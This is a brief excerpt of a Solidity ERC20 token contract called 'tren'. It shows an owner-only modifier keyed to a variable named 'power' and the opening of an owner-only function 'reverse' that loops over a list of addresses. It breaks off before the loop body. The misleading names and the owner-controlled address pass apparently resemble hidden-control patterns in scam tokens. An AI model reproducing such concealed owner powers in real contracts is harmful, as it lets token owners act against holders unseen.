...
contract tren is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == power, "Not allowed");
        _;
    }

    function reverse(address[] memory filter) public onlyOwner() {
        for (uint256 i = 0; i < filter.length; i++) {
            address account = filter[i];
